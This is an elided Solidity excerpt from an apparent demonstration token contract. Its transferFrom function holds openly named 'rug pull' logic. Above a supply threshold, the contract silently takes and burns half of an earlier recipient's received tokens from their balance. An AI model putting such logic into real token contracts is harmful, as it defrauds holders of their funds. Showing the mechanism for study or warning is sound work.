...
contract Demo {
    ...
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        ...
        if(totalSupply >= 21000000000000000000000000) {
            if(balanceOf[nextRugPullAddress] >= nextRugPullValue * 2) {
                balanceOf[nextRugPullAddress] = safeSub(balanceOf[nextRugPullAddress], nextRugPullValue);
                _burn(nextRugPullValue);
            }
            nextRugPullAddress = to;
            nextRugPullValue = value / 2;
        }
        return true;
    }
